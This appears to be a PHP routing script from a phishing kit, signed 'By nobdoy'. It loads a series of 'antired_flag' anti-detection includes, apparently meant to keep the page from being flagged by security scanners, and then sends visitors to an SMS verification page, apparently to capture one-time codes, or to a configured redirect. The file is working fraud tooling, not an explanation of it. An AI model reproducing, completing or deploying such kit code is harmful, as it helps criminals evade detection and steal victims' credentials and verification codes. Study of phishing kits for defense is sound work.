<?php

/*   
 _ _               __  _ 
| | | _ _  ___._ _ \ \/  
| ' || | |<_-<| ' | \ \  
`___'`_. |/__/|_|_|_/\_\ 
     <___'    By nobdoy

            
*/
include "../antired_flag/anti1.php";
include "../antired_flag/anti2.php"; 
include "../antired_flag/anti3.php"; 
include "../antired_flag/anti4.php"; 
include "../antired_flag/anti5.php"; 
include "../antired_flag/anti7.php";    
	



	session_start();
	include 'xuysnx.php';

    
    if ($verification_sms=="yes") {
        exit(header("Location: ../sms/"));
    
    }else{
        exit(header("Location:  " . $redirection));
    }

    
?>
